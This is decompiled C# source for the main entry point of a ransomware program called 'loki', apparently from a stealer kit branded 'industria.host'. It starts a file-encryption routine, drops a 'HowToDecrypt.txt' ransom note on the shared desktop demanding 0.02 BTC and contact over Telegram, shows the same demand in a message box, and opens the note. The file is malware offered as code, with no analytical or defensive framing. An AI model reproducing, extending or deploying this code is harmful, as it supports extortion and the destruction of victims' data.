using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using loki.industria_host.Ransomware;

namespace loki;

internal static class Program
{
	public static string dir = Path.GetTempPath() + "\\AX754VD.tmp";

	private static void Main()
	{
		//IL_009a: Unknown result type (might be due to invalid IL or missing references)
		if (Settings.ransomware)
		{
			RansomwareCrypt.start();
			File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt", "IMPORTANT INFORMATION!!!!\nAll your files are encrypted with industria.host:" + Settings.Stealer_version + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel + "\n - Contact me Telegram: @industria_host", Encoding.UTF8);
			Thread.Sleep(2000);
			MessageBox.Show("IMPORTANT INFORMATION!!!!\nAll your files are encrypted with industria.host: " + Settings.Stealer_version + "\nTo Decrypt: \n - Send 0.02 BTC to: " + Settings.bitcoin_keshel + "\n - Contact me Telegram: @industria_host");
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory) + "\\HowToDecrypt.txt");
		}
	}
}
